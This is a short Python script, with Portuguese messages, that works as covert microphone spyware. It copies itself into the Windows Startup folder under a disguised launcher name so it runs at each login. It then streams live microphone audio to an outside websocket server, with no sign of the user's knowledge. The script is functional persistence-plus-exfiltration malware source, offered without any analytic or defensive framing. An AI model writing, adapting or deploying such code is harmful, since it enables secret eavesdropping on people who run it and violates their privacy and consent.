import time
import websocket
import sounddevice as sd
import numpy as np
import struct
import os
import shutil
import sys
import uuid

current_exe = sys.executable
USERNAME = os.environ.get("USERNAME")

startup_folder = os.path.join("C:\\Users", USERNAME, "AppData", "Roaming",
                              "Microsoft", "Windows", "Start Menu", "Programs", "Startup")

dest = os.path.join(startup_folder, "bakkeslauncher.exe")

if not os.path.exists(dest):
    try:
        shutil.copy(current_exe, dest)
        print("Copiado para Startup com sucesso.")
    except Exception as e:
        print("Erro ao copiar para Startup:", e)
else:
    print("Arquivo já existe na pasta Startup, não será duplicado.")

SERVER_URL = "mic-loopback.onrender.com"
SAMPLE_RATE = 44100
CHANNELS = 1
CHUNK = 1024
DTYPE = np.int16

# ID único do transmissor
TRANSMITTER_ID = str(uuid.uuid4()).encode()[:16]  # 16 bytes

def connect_ws(server_url):
    ws = websocket.WebSocket()
    try:
        ws_url = f"wss://{server_url}"
        print(f"Tentando conectar em {ws_url} ...")
        ws.connect(ws_url)
        print("Conectado com wss://")
        return ws
    except Exception as e:
        print("Falha no wss://, tentando ws:// ...", e)
        ws_url = f"ws://{server_url}"
        ws.connect(ws_url)
        print("Conectado com ws://")
        return ws

ws = connect_ws(SERVER_URL)

def send_frame(data_bytes: bytes):
    header = struct.pack("!I", len(TRANSMITTER_ID) + len(data_bytes))
    ws.send(header + TRANSMITTER_ID + data_bytes, opcode=websocket.ABNF.OPCODE_BINARY)

def callback(indata, frames, time_info, status):
    if status:
        print("Status:", status)
    send_frame(indata.tobytes())

with sd.InputStream(samplerate=SAMPLE_RATE,
                    blocksize=CHUNK,
                    channels=CHANNELS,
                    dtype=DTYPE,
                    callback=callback):
    print("Capturando áudio e enviando...")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass

send_frame(b"__END__")
ws.close()
